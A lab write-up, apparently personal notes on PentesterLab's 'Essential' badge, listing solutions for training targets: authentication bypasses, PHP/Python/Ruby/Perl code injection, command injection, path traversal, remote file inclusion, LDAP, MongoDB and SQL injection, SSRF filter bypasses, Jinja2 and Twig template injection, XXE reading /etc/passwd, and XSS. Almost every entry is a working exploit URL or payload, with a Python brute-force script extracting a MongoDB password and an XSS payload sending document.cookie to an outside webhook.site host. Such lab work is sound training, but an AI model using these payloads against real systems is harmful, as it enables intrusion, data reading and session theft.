# Essential badge

URL: https://pentesterlab.com/badges/essential

## Authentication

### 01
ch: login as a admin

Just a matter to change the cookie `auth` to `admin`, text-plain

### 02
ch: login as admin

Modify the cookie `auth` which is `aea862aa22a0f5b829d5795882889c08` an md5

### 03
ch: login as admin

Register an user as `aDmin` username

### 04 
ch: login as admin

Register an user as `admin ` username, with the additional namespace that is ignored by mysql

### 05
ch: get the flag

intercept the HTTP 302 html content when requesting `/`, it contains the key :)

## Authorization

### 01

By navigating the url `/id/<ID Number>` you can see non-authorized information

### 02

By navigating the url `/id/<ID Number>/edit` you can see non-authorized information

### 03

The webapp is a rails app that exposes json info:
http://ptl-c17a27da-8342ee75.libcurl.st/users/1.json

### 04

chl: register an user with admin privileges

The request payload can set other obj properties
`user[username]=momo&user[password]=momo&user[admin]=true&submit=Submit`

### 05

chl: create an user with admin privileges

Similar as previous
`user%5Busername%5D=ggg&user%5Bpassword%5D=ggg&submit=Submit&user[admin]=1`

### 06

chl: create an user with is part of an organization (models...)
`user%5Busername%5D=fulano&user%5Bpassword%5D=fulano&submit=Submit&user[organisation_id]=1`

## Code execution

### 01

Run `/usr/local/bin/score e6cb11a5-8d77-412b-9cfc-d99fc6bbe509`
target: `http://ptl-41df0d58-5b5fffd3.libcurl.st/?name=hacker`
exploit: `http://ptl-41df0d58-5b5fffd3.libcurl.st/?name=hacker";system('/usr/local/bin/score%20e6cb11a5-8d77-412b-9cfc-d99fc6bbe509');//`

### 02

chl: make a code injection
exploit: `http://ptl-92cf37fa-89bb2d65.libcurl.st/?order=id);};system('/usr/local/bin/score e6cb11a5-8d77-412b-9cfc-d99fc6bbe509');//`
notes: it uses php usort() function

### 03

exploit: `http://ptl-d47b409d-42207d73.libcurl.st/?new=system('/usr/local/bin/score e6cb11a5-8d77-412b-9cfc-d99fc6bbe509')&pattern=/lamer/e&base=Hello%20lamer`
notes: it uses preg_replace() php function with `/e` on PCRE_REPLACE_EVAL

### 04

exploit: `http://ptl-ac7d180e-5efc435d.libcurl.st/?name=hacker'.system("/usr/local/bin/score e6cb11a5-8d77-412b-9cfc-d99fc6bbe509").'`
notes: exploiting the `assert()` PHP function

### 05

```
exploit: http://ptl-f3335912-d8dff103.libcurl.st/?username=hacker"+`/usr/local/bin/score e6cb11a5-8d77-412b-9cfc-d99fc6bbe509`+"
http://ptl-f3335912-d8dff103.libcurl.st/?username=hacker"%2b`/usr/local/bin/score%20e6cb11a5-8d77-412b-9cfc-d99fc6bbe509`%2b"
```

note: the url has to be encoded
note: the app has an insecure use of `eval` in Ruby

### 06

chl: `/usr/local/bin/score e6cb11a5-8d77-412b-9cfc-d99fc6bbe509`

exploit:
```
http://ptl-990cd328-4fe59cbc.libcurl.st/hello/hackerr"+os.popen('/usr/local/bin/score e6cb11a5-8d77-412b-9cfc-d99fc6bbe509').read() +"
```

notes:
- it is a python app
- it seems to be using `eval`
- to exploit, need to encode the url
- `os.sytem()` only returns a `status code`

### 07

chl:
/usr/local/bin/score e6cb11a5-8d77-412b-9cfc-d99fc6bbe509


url: 
`http://ptl-e01804a1-3d279451.libcurl.st/hello/hacker`

exploit:
`"+__import__('os').popen('/usr/local/bin/score e6cb11a5-8d77-412b-9cfc-d99fc6bbe509').read() +"`

notes:
- python application
- `os` was not loaded
- url has to be encoded

### 08
chl:
/usr/local/bin/score e6cb11a5-8d77-412b-9cfc-d99fc6bbe509

url:
`http://ptl-7fc82aee-40987409.libcurl.st/hello/hacker`

exploit: 
`"+str(__import__('os').popen(__import__('base64').b64decode('Y2F0IC9ldGMvcGFzc3dk')).read())+"`

notes:
- where `Y2F0IC9ldGMvcGFzc3dk` is `/usr/local/bin/score e6cb11a5-8d77-412b-9cfc-d99fc6bbe509`
- the url has to be encoded
- if the `%2F` slash char is being rejected/parsed by the app, then encode the "rejected" part in base64
- the vulnerable app is the Flask (python) app routing

### 09

chl:
/usr/local/bin/score e6cb11a5-8d77-412b-9cfc-d99fc6bbe509

url:
http://ptl-f2dc2643-c482a93d.libcurl.st/cgi-bin/hello?name=

exploit:
test'.`/usr/local/bin/score e6cb11a5-8d77-412b-9cfc-d99fc6bbe509`.'

notes
- the app is written in perl
- in order to run os cmds, run the cmd inside of backticks

## Command executions

### 01

chl:
/usr/local/bin/score e6cb11a5-8d77-412b-9cfc-d99fc6bbe509

url:
http://ptl-e178378e-fe879fa4.libcurl.st/?ip=127.0.0.1

exploit:
`;/usr/local/bin/score%20e6cb11a5-8d77-412b-9cfc-d99fc6bbe509`

notes:
- simple command injection

### 02
chl:
/usr/local/bin/score e6cb11a5-8d77-412b-9cfc-d99fc6bbe509

url:
http://ptl-4938c1df-399c9d4e.libcurl.st/

exploit:
- Just remove the `ip` value and put the chl payload in backtick: `command`

### 03
chl:
/usr/local/bin/score e6cb11a5-8d77-412b-9cfc-d99fc6bbe509

url:
http://ptl-836d9020-8f3b7b55.libcurl.st/?ip=127.0.0.1

exploit:
notes:
- Same exercise as before, but this time using `$(command)`

## Directory transversal

### 01
chl:
get /pentesterlab.key

url:
http://ptl-26af6ecb-545b350b.libcurl.st/file.php?file=hacker.png

exploit:
`http://ptl-26af6ecb-545b350b.libcurl.st/file.php?file=../../pentesterlab.key`

### 02
chl:
url:
http://ptl-0d8845c8-0b63b08f.libcurl.st/file.php?file=/var/www/hacker.png

exploit:
`http://ptl-0d8845c8-0b63b08f.libcurl.st/file.php?file=/var/www/../../pentesterlab.key`

notes:

### 03
chl:
url:
exploit:
`http://ptl-ded93138-2771189a.libcurl.st/file.php?file=../../pentesterlab.key%00`
notes:
- the app is automatically adding `.png` to `file=hacker`
- null byte `%00` cuts whatever is comming after a string concat


## File include

### 01
chl:
/usr/local/bin/score e6cb11a5-8d77-412b-9cfc-d99fc6bbe509

url:
http://ptl-08a17b2b-81673f5e.libcurl.st/?page=intro.php

exploit:
`http://ptl-08a17b2b-81673f5e.libcurl.st/?page=https://assets.pentesterlab.com/test_include_system.txt&c=/usr/local/bin/score e6cb11a5-8d77-412b-9cfc-d99fc6bbe509`

notes:
- https://assets.pentesterlab.com/test_include_system.txt to execute any php command on RFI

### 02
chl:
/usr/local/bin/score e6cb11a5-8d77-412b-9cfc-d99fc6bbe509

url:
http://ptl-f93fe94d-4bfe7663.libcurl.st/?page=intro

exploit:
`http://ptl-f93fe94d-4bfe7663.libcurl.st/?page=https://assets.pentesterlab.com/test_include_system.txt?blah=&c=/usr/local/bin/score e6cb11a5-8d77-412b-9cfc-d99fc6bbe509`
`http://ptl-f93fe94d-4bfe7663.libcurl.st/?page=https://assets.pentesterlab.com/test_include_system.txt%00&c=/usr/local/bin/score e6cb11a5-8d77-412b-9cfc-d99fc6bbe509`

notes:
- remember to bypass file extensions with `%00`


## LDAP

### 01
chl:
url:
http://ptl-d2cd17de-3069b85b.libcurl.st/

exploit:
Remove `username=admin&password=admin` from the POST payload

notes:
- The php authentication via LDAP
- LDAP supports NULL bind auth which would be Ok for the PHP app. 

### 02
chl:
url:
http://ptl-6b15eced-39676f9e.libcurl.st/?name=admin&password=admin

exploit:
`http://ptl-6b15eced-39676f9e.libcurl.st/?name=admin)(cn=*))%00&password=admin`

notes:
- The LDAP auth filter might be `(&(cn=[INPUT1])(userPassword=HASH[INPUT2]))`
- null byte to ignore the rest of filters

## MongoDb injections

### 01
chl:
url:
http://ptl-ff03fd29-88f1b269.libcurl.st/?username=admin&password=admin&submit=Submit

exploit:
`http://ptl-ff03fd29-88f1b269.libcurl.st/?username='|| 1==1 %00&password=admin&submit=Submit`

notes:
- tipical sqli: `' or 1=1 --`
- mongodb sqli: `'|| 1-1 %00`

### 02
chl:
- get admin password

url:
http://ptl-8e00bff4-c65e2d45.libcurl.st/?search=admin

exploit:

source code of the brute-force script:
```python
import sys
import requests
import urllib.parse

def check(reg):
    url = "http://ptl-8e00bff4-c65e2d45.libcurl.st/?search="
    payload = "admin' && this.password.match(/{}/)".format(reg)
    payload = urllib.parse.quote(payload)+"%00"

    url += payload
    pageResponse = requests.get(url)

    if(pageResponse.text.find(">admin<") is not -1):
        return True
    else:
        return False


chars = list(range(0, 10)) + list(map(chr, range(97, 123))) + ["-"]
password = ""

while 1:
    for c in chars:
        print("Trying: {} for: {}".format(c, password))

        test = password+str(c)
        if(check("^{}.*$".format(test))):
            password += str(c)
            print("Matches: {}".format(password))
            break

# result is
# 5b317d17-3ee3-4865-8605-bb579f58c10a
```

notes:
- payload to execute: `admin' && this.password.match(/.*/)%00`
- `password` is a valid field
- `&& this.password && this.password.match(... instead of just using ... && this.password.match(....`
- test the regex until find a valid password `/.*/`


## Open redirect

### 01
chl:
- exploit open redirect and get user info

url:
http://ptl-2cf8fb56-3b8ffacf.libcurl.st/redirect.php?uri=/

exploit:
- http://ptl-2cf8fb56-3b8ffacf.libcurl.st/redirect.php?uri=http://webhook.site/e3cb82b5-1862-452b-935b-6f6ad282c6e6
- Check the redirection http headers, you can find the flag 

notes:
- Site to capture redirects: http://webhook.site - you need to generate a hook

### 02
chl:
url:
http://ptl-dc0b20ac-350392f5.libcurl.st/redirect.php?uri=/

exploit:
- http://ptl-dc0b20ac-350392f5.libcurl.st/redirect.php?uri=//webhook.site/e3cb82b5-1862-452b-935b-6f6ad282c6e6
- notice the starting `//`

notes:
- `http://` vs `https://` vs `//`


## SQL Injection

### 01
chl:
bypass the login via sqli
url: 
http://ptl-b1464393-cabeb391.libcurl.st/login.php

exploit:
`admin' or 1=1 -- `

notes:
- notice the last space before the comment `-- `

### 02
chl:
same as previous

url:
http://ptl-81d264b3-87f9c741.libcurl.st/

exploit:
`admin" or 1=1 -- `
notes:

### 03
chl:

url:
http://ptl-7caee09c-1e8bb927.libcurl.st/

exploit:
`admin' OR 1=1 LIMIT 1,1 -- `

notes:
- only one result is returned by the db, can be bypassed with `LIMIT`

### 04
chl:
url:
http://ptl-214e9af7-376892bb.libcurl.st/login.php

exploit:
`username=admin%27%09or%091%3D1%09--%09&password=`

notes:
- `NO SPACE` are detected and the request fails
- spaces can be spcaped with tabs `\t` which enconded is `%09`

### 05
chl:
url:
http://ptl-d54d2e73-063fe2bb.libcurl.st/login.php

exploit:
- `admin'||1=1#`
- url encoded `username=admin%27||1%3d1%23&password=`

notes:
- spaces are not always neccesary

### 06
chl:
url:
http://ptl-8a2c9558-1643b5d4.libcurl.st/

exploit:
- encoded `username=admin%bf%27+or+1%3D1+--+&password=`

notes:
- this can lead to problems `SET CHARACTER SET 'GBK';`, having the db driver and the db itself talking different charsets
- Mysql can filter `'` but it can be bypassed by `\xBF'` (URL-encoded as `%bf%27`)

## Server side request forgery

### 01
chl:
url:
http://ptl-f7ab7279-df88ef51.libcurl.st/?url=https://assets.pentesterlab.com/hacker.txt

exploit:
http://ptl-f7ab7279-df88ef51.libcurl.st/?url=http://127.0.0.1:1234/

notes:
- access to a local running service

### 02
chl:
url:
http://ptl-2769b50a-2eceee67.libcurl.st/?url=https://assets.pentesterlab.com/hacker.txt

exploit:
http://ptl-2769b50a-2eceee67.libcurl.st/?url=http://localhost:1234

notes:
- 127.0.0.1 is filtered, but not localhost

### 03
chl:
url:
http://ptl-a0218fff-f52ba07b.libcurl.st/?url=https://assets.pentesterlab.com/hacker.txt

exploit:
http://ptl-a0218fff-f52ba07b.libcurl.st/?url=http://0.0.0.0:1234

notes:
- 127.0.0.1 and localhost are filtered

### 04
chl:
url:
http://ptl-f5443d61-d11f71ec.libcurl.st/?url=https://assets.pentesterlab.com/hacker.txt

exploit:
http://ptl-f5443d61-d11f71ec.libcurl.st/?url=http://assets.pentesterlab.com.hackingwithpentesterlab.link:1234/hacker.txt

notes:
- the domain is being filtered with a PHP function
- there is a dns server that resolves on 127.0.0.1 hackingwithpentesterlab.link



## Server side template injection

### 01
chl:
`/usr/local/bin/score e6cb11a5-8d77-412b-9cfc-d99fc6bbe509`

url:
http://ptl-20d72bd5-bb314c9c.libcurl.st/

exploit:
http://ptl-20d72bd5-bb314c9c.libcurl.st/a{{1-1}}
http://ptl-20d72bd5-bb314c9c.libcurl.st/a{{''.__class__.mro()[2].__subclasses__()[233]}}
http://ptl-20d72bd5-bb314c9c.libcurl.st/a{{''.__class__.mro()[2].__subclasses__()[233]("uname -a", shell=True).communicate()[0]}}
http://ptl-20d72bd5-bb314c9c.libcurl.st/a{{''.__class__.mro()[2].__subclasses__()[233]("/usr/local/bin/score e6cb11a5-8d77-412b-9cfc-d99fc6bbe509", shell=True).communicate()[0]}}

notes:
- jinja2 vulnerable to template injections
- {{ '7'*7 }}
- {{ [].class.base.subclasses() }} # get all classes
- {{''.class.mro()[1].subclasses()}} 
- {%for c in [1,2,3] %}{{c,c,c}}{% endfor %}

### 02
chl:
`/usr/local/bin/score e6cb11a5-8d77-412b-9cfc-d99fc6bbe509`

url:
http://ptl-49df9fe2-9aff40c5.libcurl.st/?name=hacker{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('/usr/local/bin/score e6cb11a5-8d77-412b-9cfc-d99fc6bbe509')}}

exploit:

notes:
- the vuln site uses twig template framework
- `{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('uname')}}`

## File upload

### 01
chl:
`/usr/local/bin/score e6cb11a5-8d77-412b-9cfc-d99fc6bbe509`a

url:
http://ptl-f04cf96b-a06904be.libcurl.st/

exploit:
`http://ptl-f04cf96b-a06904be.libcurl.st/upload/a.php?cmd=/usr/local/bin/score%20e6cb11a5-8d77-412b-9cfc-d99fc6bbe509`

notes:

### 02
chl:
`/usr/local/bin/score e6cb11a5-8d77-412b-9cfc-d99fc6bbe509`

url:
http://ptl-f1f71ac5-a6db0113.libcurl.st/

exploit:
`http://ptl-f1f71ac5-a6db0113.libcurl.st/upload/a.php3?cmd=/usr/local/bin/score e6cb11a5-8d77-412b-9cfc-d99fc6bbe509`

notes:
- .php is filtered, .php3 works



## XML attacks

### 01
chl:
- read /pentesterlab.key
url:
http://ptl-0d62b3e1-dec4a74d.libcurl.st/?xml=<test>hacker</test>

exploit:
- `http://ptl-0d62b3e1-dec4a74d.libcurl.st/?xml=<!DOCTYPE test [ <!ENTITY x SYSTEM "file:///etc/passwd">]><test>%26x;</test>`

notes:
- `<!DOCTYPE test [ <!ENTITY x SYSTEM "file:///etc/passwd">]>` and `&x;` which references content of /etc/passwd can be printed in a xml tag

### 02
chl:
url:
http://ptl-daa08d37-1adc53b7.libcurl.st/?name=hacker&password=pentesterlab

exploit:
`a' or 1-1]/parent::*/child::node()%00`
`http://ptl-daa08d37-1adc53b7.libcurl.st/?name=admin' or 1-1]/parent::*/child::node()%00&password=pentesterlab`

notes:
- Xpath can be queried as sql and also vulnerable to sql injections: `' and '1'=1`, `' or '1'='1`
- null byte can comment the rest of expresions

## XSS

### 01
chl:
`<script>alert('e6cb11a5-8d77-412b-9cfc-d99fc6bbe509')</script>`

url:
http://ptl-7ea3acc7-d07c7b64.libcurl.st/index.php?name=hacker

exploit:
http://ptl-7ea3acc7-d07c7b64.libcurl.st/index.php?name=hacker<script>alert('e6cb11a5-8d77-412b-9cfc-d99fc6bbe509')</script>

notes:
### 02
chl:
`<script>alert('e6cb11a5-8d77-412b-9cfc-d99fc6bbe509')</script>`

url:
http://ptl-f19cd98f-bb70679a.libcurl.st/index.php?name=hacker

exploit:
http://ptl-f19cd98f-bb70679a.libcurl.st/index.php?name=hacker<sCript>alert('e6cb11a5-8d77-412b-9cfc-d99fc6bbe509')</sCript>
notes:

### 03
chl:
`<script>alert('e6cb11a5-8d77-412b-9cfc-d99fc6bbe509')</script>`

url:
http://ptl-a5632114-d660216e.libcurl.st/index.php?name=hacker

exploit:
http://ptl-a5632114-d660216e.libcurl.st/index.php?name=hackera<scr<script>ipt>alert('e6cb11a5-8d77-412b-9cfc-d99fc6bbe509')</scr</script>ipt>

notes:
- Filtering `<script>` only one time, the idea is to inject it multiple times like: `<scr<script>ipt>`
### 04
chl:
`<script>alert('e6cb11a5-8d77-412b-9cfc-d99fc6bbe509')</script>`

url:
http://ptl-9ff0e15c-15cd4954.libcurl.st/index.php?name=hacker

exploit:
- `http://ptl-9ff0e15c-15cd4954.libcurl.st/index.php?name=hacker<img src=. onerror="alert(1)"/>`
- `http://ptl-9ff0e15c-15cd4954.libcurl.st/index.php?name=hacker<img src=. onerror="alert('e6cb11a5-8d77-412b-9cfc-d99fc6bbe509')"/>`

notes:

### 05
chl:
`<script>alert('e6cb11a5-8d77-412b-9cfc-d99fc6bbe509')</script>`

url:
http://ptl-74cd7cbe-a8c94d9f.libcurl.st/index.php?name=hacker

exploit: (payload)
`name=<script>eval(String.fromCharCode(97,108,101,114,116,40,39,101,54,99,98,49,49,97,53,45,56,100,55,55,45,52,49,50,98,45,57,99,102,99,45,100,57,57,102,99,54,98,98,101,53,48,57,39,41))</script>`

notes:
- `alert(1)` in charcode is `61,6c,65,72,74,28,31,29`

### 06
chl:
`<script>alert('e6cb11a5-8d77-412b-9cfc-d99fc6bbe509')</script>`

url:
http://ptl-072a48ff-aaf764ed.libcurl.st/index.php?name=hacker

exploit:
- `http://ptl-072a48ff-aaf764ed.libcurl.st/index.php?name=h";alert(1);//`
- `http://ptl-072a48ff-aaf764ed.libcurl.st/index.php?name=h";alert('e6cb11a5-8d77-412b-9cfc-d99fc6bbe509');//`

notes:
- by looking into the html src, it is injecting the HTTP GET value into Js code

### 07
chl:
`<script>alert('e6cb11a5-8d77-412b-9cfc-d99fc6bbe509')</script>`

url:
http://ptl-b1e74ea5-e6bf6711.libcurl.st/index.php?name=hacker

exploit:
- `http://ptl-b1e74ea5-e6bf6711.libcurl.st/index.php?name=a';alert(e6cb11a5-8d77-412b-9cfc-d99fc6bbe509);//`

notes:
- humm, esto es una estafa :/

### 08
chl:
`<script>alert('e6cb11a5-8d77-412b-9cfc-d99fc6bbe509')</script>`

url:
http://ptl-e0483a56-a3e030f9.libcurl.st/index.php

exploit:
- `http://ptl-e0483a56-a3e030f9.libcurl.st/index.php/a"><script>alert('e6cb11a5-8d77-412b-9cfc-d99fc6bbe509')</script><!--`

notes:

### 09
chl:
`<script>alert('e6cb11a5-8d77-412b-9cfc-d99fc6bbe509')</script>`

url:
http://ptl-bf67ed09-7529df2e.libcurl.st/index.php#hacker

exploit:
- `http://ptl-bf67ed09-7529df2e.libcurl.st/index.php#<script>alert('e6cb11a5-8d77-412b-9cfc-d99fc6bbe509')</script>`

notes:

### 10
chl:
- get victims cookies

url:
http://ptl-6cc11f10-31b70d53.libcurl.st/index.php?name=hacker

exploit:
- `<script>document.write('<img src="[URL]?c='+document.cookie+'" />');</script>`
- `<script>document.write('<img src="http://webhook.site/786438e6-5ffa-4d5b-a03b-2e0234e95e3c?c='+document.cookie+'" />');</script>`

notes:
- Make sure you don't forget to encode the + in the URL (%2b).
